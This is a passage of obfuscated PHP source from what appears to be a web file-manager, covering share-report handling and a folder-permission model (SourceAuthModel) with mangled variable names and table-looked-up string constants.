(empty($Ò¤€“óú[$ÚÜõáæ[369]])) { return array(); } $this->_listDataApply($Ò¤€“óú[$ÚÜõáæ[369]]); return $Ò¤€“óú; } public function listDataApply($Şº‚«¡É) { $this->_listDataApply($Şº‚«¡É); return $Şº‚«¡É; } private function _listDataApply(&$ŸîÊïİ¥) { $çÏ˜°‘² =& $_SERVER[§ŒØóıü]; $±™ÔÉ¥² = array_to_keyvalue($ŸîÊïİ¥, $çÏ˜°‘²[12], $çÏ˜°‘²[1673]); $Ø­õ¢ªü = Model($çÏ˜°‘²[525])->userListInfo(array_unique($±™ÔÉ¥²)); $©Ïæ«Ò = array_to_keyvalue($ŸîÊïİ¥, $çÏ˜°‘²[12], $çÏ˜°‘²[402]); $ãÀÈ‘á = Model($çÏ˜°‘²[831])->sourceListInfo($©Ïæ«Ò, !0); foreach ($ŸîÊïİ¥ as $øíóí» => &$®ì‡¹–ú) { $Æ›¡…Öé = $®ì‡¹–ú[$çÏ˜°‘²[1673]]; $®ì‡¹–ú[$çÏ˜°‘²[2034]] = $Ø­õ¢ªü[$Æ›¡…Öé] ? $Ø­õ¢ªü[$Æ›¡…Öé] : !1; $Æç£¡© = $®ì‡¹–ú[$çÏ˜°‘²[402]]; $®ì‡¹–ú[$çÏ˜°‘²[87]] = $ãÀÈ‘á[$Æç£¡©] ? $ãÀÈ‘á[$Æç£¡©] : !1; if ($®ì‡¹–ú[$çÏ˜°‘²[87]][$çÏ˜°‘²[431]] == $çÏ˜°‘²[88]) { unset($ŸîÊïİ¥[$øíóí»]); } if ($®ì‡¹–ú[$çÏ˜°‘²[87]] != $çÏ˜°‘²[198] && !$®ì‡¹–ú[$çÏ˜°‘²[87]]) { unset($ŸîÊïİ¥[$øíóí»]); } } unset($®ì‡¹–ú); $ŸîÊïİ¥ = array_values($ŸîÊïİ¥); } private function _makeOrder($˜ÈÅÅ¹Ì = '') { $Ôºí§Šå =& $_SERVER[§ŒØóıü]; $…Ãöä¼¿ = array($Ôºí§Šå[201], $Ôºí§Šå[767], $Ôºí§Šå[2021], $Ôºí§Šå[2022]); $±é€Û‰ = array($Ôºí§Šå[450] => $Ôºí§Šå[451], $Ôºí§Šå[452] => $Ôºí§Šå[453]); $¿òÍØºû = Input::get($Ôºí§Šå[457], $Ôºí§Šå[7], $Ôºí§Šå[423], $…Ãöä¼¿); $…Ê”Š¡µ = Input::get($Ôºí§Šå[458], $Ôºí§Šå[7], $Ôºí§Šå[2035], array($Ôºí§Šå[1953], $Ôºí§Šå[452])); $…Ê”Š¡µ = $±é€Û‰[$…Ê”Š¡µ]; $˜ÈÅÅ¹Ì = $˜ÈÅÅ¹Ì . "{$¿òÍØºû}\40{$…Ê”Š¡µ}"; return $this->order($˜ÈÅÅ¹Ì); } public function reportAdd($é²­î¸) { $ß‹Âúş =& $_SERVER[§ŒØóıü]; $³“Ìá¡ = array($ß‹Âúş[593] => $é²­î¸[$ß‹Âúş[593]], $ß‹Âúş[1673] => USER_ID); if (Model($ß‹Âúş[2031])->where($³“Ìá¡)->find()) { return !1; } $¥ÓÑ¹ÃÃ = array($ß‹Âúş[593] => $é²­î¸[$ß‹Âúş[593]], $ß‹Âúş[1573] => $é²­î¸[$ß‹Âúş[1573]], $ß‹Âúş[402] => $é²­î¸[$ß‹Âúş[402]], $ß‹Âúş[468] => $é²­î¸[$ß‹Âúş[468]], $ß‹Âúş[1673] => USER_ID, $ß‹Âúş[33] => $é²­î¸[$ß‹Âúş[33]], $ß‹Âúş[453] => $é²­î¸[$ß‹Âúş[453]]); return Model($ß‹Âúş[2031])->add($¥ÓÑ¹ÃÃ); } public function reportList($Å‚°áĞ¿) { $š£›—® =& $_SERVER[§ŒØóıü]; $ŒŒÖûµ = array(); if ($Å‚°áĞ¿[$š£›—®[766]]) { $ƒÌŒ¿«« = $Å‚°áĞ¿[$š£›—®[767]] ? $Å‚°áĞ¿[$š£›—®[767]] : strtotime(date($š£›—®[2033])); $ŒŒÖûµ[$š£›—®[201]] = array($š£›—®[333], array($Å‚°áĞ¿[$š£›—®[766]], $ƒÌŒ¿««)); } if (isset($Å‚°áĞ¿[$š£›—®[33]]) && in_array($Å‚°áĞ¿[$š£›—®[33]], array($š£›—®[88], $š£›—®[437], $š£›—®[2036], $š£›—®[2037], $š£›—®[2038]))) { $ŒŒÖûµ[$š£›—®[33]] = $Å‚°áĞ¿[$š£›—®[33]]; } if (isset($Å‚°áĞ¿[$š£›—®[755]]) && in_array($Å‚°áĞ¿[$š£›—®[755]], array($š£›—®[198], $š£›—®[88], $š£›—®[437], $š£›—®[2036]))) { $ŒŒÖûµ[$š£›—®[755]] = $Å‚°áĞ¿[$š£›—®[755]]; } $÷ÓÍªôÆ = Input::get($š£›—®[458], $š£›—®[7], $š£›—®[2035], array($š£›—®[1953], $š£›—®[452])); $˜×¥ ºª = array($š£›—®[450] => $š£›—®[451], $š£›—®[452] => $š£›—®[453]); $şµ“œ÷ = $š£›—®[2039] . $˜×¥ ºª[$÷ÓÍªôÆ]; $¦”Û›à = Model($š£›—®[2031])->where($ŒŒÖûµ)->order($şµ“œ÷)->selectPage(20); if (empty($¦”Û›à[$š£›—®[369]])) { return array(); } $§ÃªıœŸ = array_to_keyvalue_group($¦”Û›à[$š£›—®[369]], $š£›—®[755], $š£›—®[593]); if (!empty($§ÃªıœŸ[0])) { $Å‚°áĞ¿ = $§ÃªıœŸ[0]; $ŒŒÖûµ = array($š£›—®[593] => array($š£›—®[7], $Å‚°áĞ¿)); $ôöºàğŞ = $this->where($ŒŒÖûµ)->field($š£›—®[593])->select(); $ôöºàğŞ = array_to_keyvalue($ôöºàğŞ, $š£›—®[12], $š£›—®[593]); $­“ê”ä» = array_diff($Å‚°áĞ¿, $ôöºàğŞ); if (!empty($­“ê”ä»)) { foreach ($¦”Û›à[$š£›—®[369]] as $Ä”Á›ğê => $©ñĞç˜ú) { if (in_array($©ñĞç˜ú[$š£›—®[593]], $­“ê”ä»)) { unset($¦”Û›à[$š£›—®[369]][$Ä”Á›ğê]); } } } } $this->_listDataApply($¦”Û›à[$š£›—®[369]]); return $¦”Û›à; } public function reportStatus($³Š§Ç—•) { $õƒë«¢ü =& $_SERVER[§ŒØóıü]; $ƒàè“Ñ‚ = array($õƒë«¢ü[399] => $³Š§Ç—•[$õƒë«¢ü[399]]); $ıİ”İ¡ = Model($õƒë«¢ü[2031])->where($ƒàè“Ñ‚)->field($õƒë«¢ü[2040])->find(); if (!$ıİ”İ¡) { return !1; } $¸°Çü®õ = array($õƒë«¢ü[755] => $³Š§Ç—•[$õƒë«¢ü[755]]); if ($³Š§Ç—•[$õƒë«¢ü[755]] == $õƒë«¢ü[2036] && $ıİ”İ¡[$õƒë«¢ü[755]] == $õƒë«¢ü[2036]) { $¸°Çü®õ[$õƒë«¢ü[755]] = 0; } $ñ‰»¨Õè = Model($õƒë«¢ü[2031])->where($ƒàè“Ñ‚)->save($¸°Çü®õ); if ($³Š§Ç—•[$õƒë«¢ü[755]] == $õƒë«¢ü[437]) { if ($ıİ”İ¡[$õƒë«¢ü[468]] != $õƒë«¢ü[198] && $this->shareFileMeta($ıİ”İ¡[$õƒë«¢ü[468]])) { $this->shareFileMeta($ıİ”İ¡[$õƒë«¢ü[468]], 0); } $this->remove($ıİ”İ¡[$õƒë«¢ü[593]]); return !0; } if ($ñ‰»¨Õè && $³Š§Ç—•[$õƒë«¢ü[755]] == $õƒë«¢ü[2036]) { $ëµàÄõÒ = $¸°Çü®õ[$õƒë«¢ü[755]] == $õƒë«¢ü[2036] ? 1 : 0; $this->shareFileMeta($ıİ”İ¡[$õƒë«¢ü[468]], $ëµàÄõÒ); $this->removeByFile($ıİ”İ¡[$õƒë«¢ü[468]]); } return $ñ‰»¨Õè; } private function removeByFile($ŸÉçíÙ») { $ÕŒÒŠª» =& $_SERVER[§ŒØóıü]; $€¨©Ş· = Model($ÕŒÒŠª»[831])->where(array($ÕŒÒŠª»[468] => $ŸÉçíÙ»))->field($ÕŒÒŠª»[402])->select(); $Ç¨û˜¸Ã = array_to_keyvalue($€¨©Ş·, $ÕŒÒŠª»[12], $ÕŒÒŠª»[402]); $…€Í¢ß = array($ÕŒÒŠª»[402] => array($ÕŒÒŠª»[7], $Ç¨û˜¸Ã), $ÕŒÒŠª»[488] => 1); $€¨©Ş· = $this->where($…€Í¢ß)->field($ÕŒÒŠª»[593])->select(); if (empty($€¨©Ş·)) { return; } $“®ÉÀ´ = array_to_keyvalue($€¨©Ş·, $ÕŒÒŠª»[12], $ÕŒÒŠª»[593]); $this->remove($“®ÉÀ´); } private function shareFileMeta($İÖÇ”í, $‰«õõôÄ = null) { $—®ÃËÎ­ =& $_SERVER[§ŒØóıü]; $õ¯Ğ±¹Ğ = array($—®ÃËÎ­[468] => $İÖÇ”í, $—®ÃËÎ­[94] => $—®ÃËÎ­[2041]); if (is_null($‰«õõôÄ)) { return Model($—®ÃËÎ­[2042])->where($õ¯Ğ±¹Ğ)->find(); } $õ¯Ğ±¹Ğ[$—®ÃËÎ­[374]] = $‰«õõôÄ; Model($—®ÃËÎ­[2042])->add($õ¯Ğ±¹Ğ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\x63\x65\137\x61\x75\164\150"; public function getAuth($¬åæÍÈ€) { $ÁúôÇÓ =& $_SERVER[§ŒØóıü]; $”ÜµÔú = $this->sourceAuthSelect($¬åæÍÈ€); $—¹ÛÆó¬ = array(); $¤ÏŞ©‰ß = array(); $íò‡ìËä = 2 << 25; foreach ($”ÜµÔú as $Æø€î‚ı) { $®ÓŸĞ‡˜ = Model($ÁúôÇÓ[498])->listData($Æø€î‚ı[$ÁúôÇÓ[1966]]); if (!$®ÓŸĞ‡˜) { continue; } $—¹ÛÆó¬[] = $Æø€î‚ı; $×¾¥ï¬ = 0; if ($Æø€î‚ı[$ÁúôÇÓ[411]] == SourceModel::TYPE_GROUP) { $×¾¥ï¬ = $íò‡ìËä * 2; } if ($Æø€î‚ı[$ÁúôÇÓ[411]] == SourceModel::TYPE_USER) { $×¾¥ï¬ = $íò‡ìËä; } if ($Æø€î‚ı[$ÁúôÇÓ[411]] == SourceModel::TYPE_USER && $Æø€î‚ı[$ÁúôÇÓ[496]] == $ÁúôÇÓ[198]) { $×¾¥ï¬ = 0; } $¤ÏŞ©‰ß[] = $®ÓŸĞ‡˜[$ÁúôÇÓ[413]] + $×¾¥ï¬; } array_multisort($¤ÏŞ©‰ß, SORT_DESC, $—¹ÛÆó¬); return $—¹ÛÆó¬; } public function sourceAuthSelect($¨À×¶å¨) { $ïÜËÈãƒ =& $_SERVER[§ŒØóıü]; static $’ÚÍ–Ö— = array(); $èÍ·óÜä = is_array($¨À×¶å¨) ? !1 : !0; if ($èÍ·óÜä) { $¨À×¶å¨ = array($¨À×¶å¨); } $øÎææ = array(); foreach ($¨À×¶å¨ as $’ßÇ”õ’) { if (isset($’ÚÍ–Ö—[$’ßÇ”õ’])) { $øÎææ[$’ßÇ”õ’] = $’ÚÍ–Ö—[$’ßÇ”õ’]; } } if (count($øÎææ) == count($¨À×¶å¨)) { return $èÍ·óÜä ? $øÎææ[$¨À×¶å¨[0]] : $øÎææ; } $û™‚¿£Ö = $ïÜËÈãƒ[2043]; $ä”¡ğ•‹ = array($ïÜËÈãƒ[402] => array($ïÜËÈãƒ[7], $¨À×¶å¨)); $˜ÈÍçãÆ = $this->field($û™‚¿£Ö)->order($ïÜËÈãƒ[399])->where($ä”¡ğ•‹)->select(); $Üé»ãˆò = array_to_keyvalue_group($˜ÈÍçãÆ, $ïÜËÈãƒ[402]); foreach ($¨À×¶å¨ as $’ßÇ”õ’) { $’ÚÍ–Ö—[$’ßÇ”õ’] = $Üé»ãˆò[$’ßÇ”õ’] ? $Üé»ãˆò[$’ßÇ”õ’] : array(); } if ($èÍ·óÜä) { return $˜ÈÍçãÆ; } return $Üé»ãˆò; } public function setAuth($»¡Ÿ´ØÖ, $ü÷º´ƒ) { $÷á–ˆª =& $_SERVER[§ŒØóıü]; $ŠÎ‹¼Ÿ = Model($÷á–ˆª[1345])->sourceInfo($»¡Ÿ´ØÖ); if (!$ŠÎ‹¼Ÿ) { return !1; } if ($ŠÎ‹¼Ÿ[$÷á–ˆª[411]] != SourceModel::TYPE_GROUP) { return !1; } $Ç§™¡ = 1; $âŞ…„†à = $ŠÎ‹¼Ÿ[$÷á–ˆª[496]]; if ($âŞ…„†à != $Ç§™¡) { $¾İÌ = array($÷á–ˆª[1862] => $âŞ…„†à); $‘¥ÒæÓü = Model($÷á–ˆª[1952])->field($÷á–ˆª[1673])->where($¾İÌ)->select(); $‘¥ÒæÓü = array_to_keyvalue($‘¥ÒæÓü, $÷á–ˆª[12], $÷á–ˆª[1673]); } $¾»İ…ºÉ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $«‡Æ—Úç = array(); foreach ($ü÷º´ƒ as $š­Ñ×Ÿ) { if (!in_array($š­Ñ×Ÿ[$÷á–ˆª[411]], $¾»İ…ºÉ)) { show_json(LNG($÷á–ˆª[2044]), !1); } if ($âŞ…„†à != $Ç§™¡) { if ($š­Ñ×Ÿ[$÷á–ˆª[411]] == SourceModel::TYPE_GROUP) { } if ($š­Ñ×Ÿ[$÷á–ˆª[496]] != 0 && !in_array($š­Ñ×Ÿ[$÷á–ˆª[496]], $‘¥ÒæÓü)) { } } if ($š­Ñ×Ÿ[$÷á–ˆª[496]] == 0) { $š­Ñ×Ÿ[$÷á–ˆª[411]] = SourceModel::TYPE_USER; } $«‡Æ—Úç[] = array($÷á–ˆª[402] => $»¡Ÿ´ØÖ, $÷á–ˆª[411] => intval($š­Ñ×Ÿ[$÷á–ˆª[411]]), $÷á–ˆª[496] => intval($š­Ñ×Ÿ[$÷á–ˆª[496]]), $÷á–ˆª[1966] => intval($š­Ñ×Ÿ[$÷á–ˆª[1966]]) ? intval($š­Ñ×Ÿ[$÷á–ˆª[1966]]) : 0, $÷á–ˆª[2026] => intval($š­Ñ×Ÿ[$÷á–ˆª[2026]]) ? intval($š­Ñ×Ÿ[$÷á–ˆª[2026]]) : -1); } $this->where(array($÷á–ˆª[417] => $»¡Ÿ´ØÖ))->delete(); $this->addAll($«‡Æ—Úç); return !0; } public function authClear($ášøÔ) { $İÆÉ¸¬ =& $_SERVER[§ŒØóıü]; $Àò‰°ƒì = Model($İÆÉ¸¬[1345])->sourceInfo($ášøÔ); $ô‡ç¤³× = array($ášøÔ); if ($Àò‰°ƒì[$İÆÉ¸¬[410]] == $İÆÉ¸¬[88]) { $„½ÚúÔü = array($İÆÉ¸¬[580] => array($İÆÉ¸¬[540], $Àò‰°ƒì[$İÆÉ¸¬[511]] . $ášøÔ . $İÆÉ¸¬[541])); $ô‡ç¤³× = Model($İÆÉ¸¬[1345])->field($İÆÉ¸¬[417])->where($„½ÚúÔü)->getField($İÆÉ¸¬[402], !0); $ô‡ç¤³×[] = $ášøÔ; } $this->where(array($İÆÉ¸¬[417] => array($İÆÉ¸¬[418], $ô‡ç¤³×)))->delete(); return !0; } public function getAllChildren($Ë‹Œà³’) { $¤Ñš¼âµ =& $_SERVER[§ŒØóıü]; $Œ§ªÇ«Ğ = Model($¤Ñš¼âµ[1345])->sourceInfo($Ë‹Œà³’); if ($Œ§ªÇ«Ğ[$¤Ñš¼âµ[410]] != $¤Ñš¼âµ[88]) { return $this->sourceListAuth(array($Ë‹Œà³’)); } if ($Œ§ªÇ«Ğ[$¤Ñš¼âµ[411]] != SourceModel::TYPE_GROUP) { return array(); } $ÎÉÔŸ³€ = 1; $óŠğ¬­÷ = array($Ë‹Œà³’); if ($Œ§ªÇ«Ğ[$¤Ñš¼âµ[432]] == $¤Ñš¼âµ[198] && $Œ§ªÇ«Ğ[$¤Ñš¼âµ[496]] != $ÎÉÔŸ³€) { $óŠğ¬­÷ = $this->groupChidldAllRootSource($Œ§ªÇ«Ğ[$¤Ñš¼âµ[496]]); } $²´Á‹æì = $this->field($¤Ñš¼âµ[402])->group($¤Ñš¼âµ[402])->select(); $²´Á‹æì = array_to_keyvalue($²´Á‹æì, $¤Ñš¼âµ[12], $¤Ñš¼âµ[402]); if (!$²´Á‹æì) { return array(); } $Œ“çŒÊ = $¤Ñš¼âµ[2045]; $ÆŞ¸çì = array($¤Ñš¼âµ[402] => array($¤Ñš¼âµ[7], $²´Á‹æì), $¤Ñš¼âµ[431] => $¤Ñš¼âµ[198]); $ËÒš¶¥ = Model($¤Ñš¼âµ[831])->field($Œ“çŒÊ)->where($ÆŞ¸çì)->select(); $¶çÚúÙä = array($Ë‹Œà³’); foreach ($ËÒš¶¥ as $Éñ¨µ°ü) { foreach ($óŠğ¬­÷ as $–ÄŒ±Ú) { $µ”™½İî = $¤Ñš¼âµ[50] . $–ÄŒ±Ú . $¤Ñš¼âµ[50]; $“Ù½ññï = $Éñ¨µ°ü[$¤Ñš¼âµ[511]] . $Éñ¨µ°ü[$¤Ñš¼âµ[402]] . $¤Ñš¼âµ[50]; if (strstr($“Ù½ññï, $µ”™½İî)) { $¶çÚúÙä[] = $Éñ¨µ°ü[$¤Ñš¼âµ[402]]; break; } } } return $this->sourceListAuth($¶çÚúÙä); } private function sourceListAuth($˜Áåî„¸) { $©°ıÍ¯ª =& $_SERVER[§ŒØóıü]; $ÒÎ‡õìş = Model($©°ıÍ¯ª[1345])->sourceListInfo($˜Áåî„¸, !0); $İƒóÀ×½ = $this->sourceAuthSelect($˜Áåî„¸); $ÒÓ«õÔø = array(); $•¶«Ì¤ç = array(); foreach ($ÒÎ‡õìş as $•“ø½¼é) { unset($•“ø½¼é[$©°ıÍ¯ª[456]]); unset($•“ø½¼é[$©°ıÍ¯ª[454]]); unset($•“ø½¼é[$©°ıÍ¯ª[413]]); unset($•“ø½¼é[$©°ıÍ¯ª[87]]); $ûÁ½âÒ = $İƒóÀ×½[$•“ø½¼é[$©°ıÍ¯ª[402]]]; if (!$ûÁ½âÒ) { continue; } $•“ø½¼é[$©°ıÍ¯ª[2046]] = $this->authTargetInfo($ûÁ½âÒ); $•“ø½¼é[$©°ıÍ¯ª[509]] = rtrim($•“ø½¼é[$©°ıÍ¯ª[515]], $©°ıÍ¯ª[8]) . $©°ıÍ¯ª[8] . ltrim($•“ø½¼é[$©°ıÍ¯ª[509]], $©°ıÍ¯ª[8]); $ÒÓ«õÔø[] = $•“ø½¼é; $ú“˜¦ñ = count(explode($©°ıÍ¯ª[8], trim($•“ø½¼é[$©°ıÍ¯ª[509]], $©°ıÍ¯ª[8]))); $•¶«Ì¤ç[] = $ú“˜¦ñ + ($•“ø½¼é[$©°ıÍ¯ª[33]] == $©°ıÍ¯ª[75] ? 0 : 1000); } array_multisort($•¶«Ì¤ç, SORT_ASC, $ÒÓ«õÔø); return $ÒÓ«õÔø; } private function groupChidldAllRootSource($””˜Æ¢«) { $é˜†Ø¨õ =& $_SERVER[§ŒØóıü]; $°Ñòºé = Model($é˜†Ø¨õ[2047])->groupChildrenAll($””˜Æ¢«); $š¶ãÈ = array($é˜†Ø¨õ[432] => 0, $é˜†Ø¨õ[496] => array($é˜†Ø¨õ[7], $°Ñòºé), $é˜†Ø¨õ[411] => SourceModel::TYPE_GROUP); $ã–ùå = Model($é˜†Ø¨õ[831])->field($é˜†Ø¨õ[402])->where($š¶ãÈ)->select(); $ã–ùå = array_to_keyvalue($ã–ùå, $é˜†Ø¨õ[12], $é˜†Ø¨õ[402]); return $ã–ùå; } private function authTargetInfo($ˆ¶««óÄ) { $Ìí¶‘ß =& $_SERVER[§ŒØóıü]; $›™ËÛ = array(); $àÑ€ÖŠ° = array(); $†«ãçÖÇ = 2 << 25; foreach ($ˆ¶««óÄ as $ÛáÄéİŞ) { $È•ÒïÌ— = Model($Ìí¶‘ß[498])->listData($ÛáÄéİŞ[$Ìí¶‘ß[1966]]); if (!$È•ÒïÌ—) { continue; } if ($ÛáÄéİŞ[$Ìí¶‘ß[411]] == SourceModel::TYPE_USER) { $ë·§óüó = Model($Ìí¶‘ß[504])->getInfoSimpleOuter($ÛáÄéİŞ[$Ìí¶‘ß[496]]); if ($ë·§óüó[$Ìí¶‘ß[1673]] == $Ìí¶‘ß[1194]) { continue; } if ($ë·§óüó[$Ìí¶‘ß[1673]] == $Ìí¶‘ß[198]) { $ë·§óüó[$Ìí¶‘ß[32]] = LNG($Ìí¶‘ß[2048]); } } else { $ë·§óüó = Model($Ìí¶‘ß[512])->getInfoSimple($ÛáÄéİŞ[$Ìí¶‘ß[496]]); } if (!$ë·§óüó) { continue; } $ë·§óüó[$Ìí¶‘ß[467]] = $È•ÒïÌ—; $›™ËÛ[] = $ë·§óüó; $»á¡ÊÑû = 0; if ($ÛáÄéİŞ[$Ìí¶‘ß[411]] == SourceModel::TYPE_GROUP) { $»á¡ÊÑû = $†«ãçÖÇ * 2; } if ($ÛáÄéİŞ[$Ìí¶‘ß[411]] == SourceModel::TYPE_USER) { $»á¡ÊÑû = $†«ãçÖÇ; } if ($ÛáÄéİŞ[$Ìí¶‘ß[411]] == SourceModel::TYPE_USER && $ÛáÄéİŞ[$Ìí¶‘ß[496]] == $Ìí¶‘ß[198]) { $»á¡ÊÑû = 0; } $àÑ€ÖŠ°[] = $È•ÒïÌ—[$Ìí¶‘ß[413]] + $»á¡ÊÑû; } array_multisort($àÑ€ÖŠ°, SORT_DESC, $›™ËÛ); return $›™ËÛ; } public function getAllChildrenByUser($†®òæ‹€, $Å·Æùó) { $Ùşİ§³ =& $_SERVER[§ŒØóıü]; $î¦·»ğ‡ = Model($Ùşİ§³[525])->getInfo($Å·Æùó); if (!$Å·Æùó || !$†®òæ‹€ || !$î¦·»ğ‡) { return array(); } $²“œà® = Model($Ùşİ§³[1345])->sourceInfo($†®òæ‹€); $½å±†ÆÔ = array(); $…ı¤š = 1; if ($²“œà®[$Ùşİ§³[432]] == $Ùşİ§³[198] && $²“œà®[$Ùşİ§³[496]] != $…ı¤š && $this->groupContainUser($²“œà®[$Ùşİ§³[496]], $Å·Æùó)) { foreach ($î¦·»ğ‡[$Ùşİ§³[2049]] as $÷³¨¿š”) { $ÁÃÖî– = Model($Ùşİ§³[512])->getInfo($÷³¨¿š”[$Ùşİ§³[1862]]); $’“õé§“ = Model($Ùşİ§³[525])->getInfoSimpleOuter($Å·Æùó); $’“õé§“[$Ùşİ§³[467]] = $÷³¨¿š”[$Ùşİ§³[413]]; if (Model($Ùşİ§³[498])->authCheckAction($÷³¨¿š”[$Ùşİ§³[413]][$Ùşİ§³[413]], $Ùşİ§³[1883])) { continue; } $Ñ”Ş£¡“ = array($Ùşİ§³[32] => $Ùşİ§³[1214] . $ÁÃÖî–[$Ùşİ§³[32]], $Ùşİ§³[402] => $ÁÃÖî–[$Ùşİ§³[87]][$Ùşİ§³[402]], $Ùşİ§³[84] => KodIO::make($ÁÃÖî–[$Ùşİ§³[87]][$Ùşİ§³[402]]), $Ùşİ§³[432] => $Ùşİ§³[198], $Ùşİ§³[411] => $Ùşİ§³[505], $Ùşİ§³[33] => $Ùşİ§³[544], $Ùşİ§³[509] => $ÁÃÖî–[$Ùşİ§³[516]], $Ùşİ§³[1862] => $ÁÃÖî–[$Ùşİ§³[1862]], $Ùşİ§³[513] => $ÁÃÖî–[$Ùşİ§³[432]], $Ùşİ§³[2046] => array($’“õé§“)); $½å±†ÆÔ[$Ñ”Ş£¡“[$Ùşİ§³[402]]] = $Ñ”Ş£¡“; } } $’ş©ı•› = array(); $¹›â‚ğ = $this->getAllChildren($†®òæ‹€); foreach ($¹›â‚ğ as $¬¹§¤‡ô) { $¶âÒ°­ = !1; foreach ($¬¹§¤‡ô[$Ùşİ§³[2046]] as $§´²ñ¨) { if ($§´²ñ¨[$Ùşİ§³[1673]]) { if ($§´²ñ¨[$Ùşİ§³[1673]] == $Å·Æùó) { $¶âÒ°­ = !0; break; } } if ($§´²ñ¨[$Ùşİ§³[1862]]) { if ($this->groupContainUser($§´²ñ¨[$Ùşİ§³[1862]], $Å·Æùó)) { $¶âÒ°­ = !0; break; } } } if ($¶âÒ°­) { $’ş©ı•›[] = $¬¹§¤‡ô; } $¬¿Ç¯õØ = $¬¹§¤‡ô[$Ùşİ§³[402]]; if (isset($½å±†ÆÔ[$¬¿Ç¯õØ])) { $¬¹§¤‡ô[$Ùşİ§³[2046]][] = $½å±†ÆÔ[$¬¿Ç¯õØ][0]; $½å±†ÆÔ[$¬¿Ç¯õØ] = !1; } } $½å±†ÆÔ = array_filter(array_values($½å±†ÆÔ)); $’ş©ı•› = array_merge($½å±†ÆÔ, $’ş©ı•›); return $’ş©ı•›; } public function setAllChildrenByUser($¤ùòÑ§İ, $¼ÔÖƒ¦, $Çàó¢×) { $äÜ¤´å½ =& $_SERVER[§ŒØóıü]; $è²–Ÿãğ = $this->getAllChildrenByUser($¤ùòÑ§İ, $¼ÔÖƒ¦); if (!$Çàó¢× || !$è²–Ÿãğ) { return !1; } foreach ($è²–Ÿãğ as $É¶£¯ü) { $Õ­œî¤ = array(); foreach ($É¶£¯ü[$äÜ¤´å½[2046]] as $·ô¥—³¿) { $œ‰ÚìØ™ = $·ô¥—³¿[$äÜ¤´å½[467]]; $æÆ¿İÕ‰ = $·ô¥—³¿[$äÜ¤´å½[1673]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Âº¨ä§ = $·ô¥—³¿[$äÜ¤´å½[1673]] ? $·ô¥—³¿[$äÜ¤´å½[1673]] : $·ô¥—³¿[$äÜ¤´å½[1862]]; if ($·ô¥—³¿[$äÜ¤´å½[1673]] && $·ô¥—³¿[$äÜ¤´å½[1673]] == $¼ÔÖƒ¦) { continue; } $Õ­œî¤[] = array($äÜ¤´å½[402] => $É¶£¯ü[$äÜ¤´å½[402]], $äÜ¤´å½[411] => $æÆ¿İÕ‰, $äÜ¤´å½[496] => intval($Âº¨ä§), $äÜ¤´å½[1966] => isset($œ‰ÚìØ™[$äÜ¤´å½[399]]) ? intval($œ‰ÚìØ™[$äÜ¤´å½[399]]) : 0, $äÜ¤´å½[2026] => isset($œ‰ÚìØ™[$äÜ¤´å½[2026]]) ? intval($œ‰ÚìØ™[$äÜ¤´å½[2026]]) : -1); } $Õ­œî¤[] = array($äÜ¤´å½[402] => $É¶£¯ü[$äÜ¤´å½[402]], $äÜ¤´å½[411] => SourceModel::TYPE_USER, $äÜ¤´å½[496] => intval($¼ÔÖƒ¦), $äÜ¤´å½[1966] => intval($Çàó¢×), $äÜ¤´å½[2026] => -1); $this->where(array($äÜ¤´å½[417] => $É¶£¯ü[$äÜ¤´å½[402]]))->delete(); $this->addAll($Õ­œî¤); } return !0; } public function get($Îøœ¨ãÙ) { $ìÊÈ” = $this->getSourceList(array($Îøœ¨ãÙ), !0); return $ìÊÈ”[0]; } public function getSourceList($Úª‘Óò‘, $šõ»¬Ğß = false, $Ë´˜¿¸Ó = false) { $£‰Á’Â¯ =& $_SERVER[§ŒØóıü]; if (!$Úª‘Óò‘) { return array(); } $÷¡€ìÂ÷ = Model($£‰Á’Â¯[1345]); if (!$šõ»¬Ğß && count($Úª‘Óò‘) == 1) { $šõ»¬Ğß = array(); $šõ»¬Ğß[$Úª‘Óò‘[0]] = $÷¡€ìÂ÷->sourceInfo($Úª‘Óò‘[0]); } if (!$šõ»¬Ğß) { $Í¬Î¦Áò = array($£‰Á’Â¯[417] => array($£‰Á’Â¯[418], $Úª‘Óò‘)); $šõ»¬Ğß = $÷¡€ìÂ÷->field($£‰Á’Â¯[2050])->where($Í¬Î¦Áò)->select(); $šõ»¬Ğß = array_to_keyvalue($šõ»¬Ğß, $£‰Á’Â¯[402]); } $ºğû­Ì = $Úª‘Óò‘; foreach ($šõ»¬Ğß as $È…£»› => $¢€ëÇÌ) { $ºÅ‘ê•Å = $÷¡€ìÂ÷->parentLevelArray($¢€ëÇÌ[$£‰Á’Â¯[511]]); $ºğû­Ì = array_merge($ºğû­Ì, array($È…£»›), array_reverse($ºÅ‘ê•Å)); } $ºğû­Ì = array_values(array_unique($ºğû­Ì)); if (!$ºğû­Ì) { return array(); } $ş¿¦‡ıú = $this->sourceAuthSelect($ºğû­Ì); $¯±½¼Áµ = array(); foreach ($ºğû­Ì as $ê•Üº¾Î) { if (isset($ş¿¦‡ıú[$ê•Üº¾Î])) { $¯±½¼Áµ[$ê•Üº¾Î] = $ş¿¦‡ıú[$ê•Üº¾Î]; } } $•í© = $this->userIsRoot($Ë´˜¿¸Ó); $ŒÏ»Æğ = AuthModel::authAll(); $Œ§÷âñÉ = array($£‰Á’Â¯[414] => $ŒÏ»Æğ, $£‰Á’Â¯[2051] => array($£‰Á’Â¯[419] => 0, $£‰Á’Â¯[1868] => $ŒÏ»Æğ, $£‰Á’Â¯[420] => LNG($£‰Á’Â¯[2052]), $£‰Á’Â¯[1885] => $£‰Á’Â¯[2053])); $Ï´Ä¯’ó = array(); foreach ($šõ»¬Ğß as $ê•Üº¾Î => $´¥ÌŠëà) { if ($•í© && $GLOBALS[$£‰Á’Â¯[6]][$£‰Á’Â¯[1881]]) { $Ï´Ä¯’ó[$ê•Üº¾Î] = $Œ§÷âñÉ; continue; } $Ï´Ä¯’ó[$ê•Üº¾Î] = $this->makeSourceAuth($´¥ÌŠëà, $¯±½¼Áµ, $Ë´˜¿¸Ó); } return $Ï´Ä¯’ó; } public function authDeepCheck($Äºİò“ˆ, $°Ş¬ûô¹ = false) { $î£Òï—× =& $_SERVER[§ŒØóıü]; $°Ş¬ûô¹ = $°Ş¬ûô¹ ? $°Ş¬ûô¹ : USER_ID; $Ö¿·´´õ = $this->makeAuthDeep($°Ş¬ûô¹); if (!in_array($Äºİò“ˆ, $Ö¿·´´õ[$î£Òï—×[2054]])) { return !1; } $ı§»Œ¬ì = array(); foreach 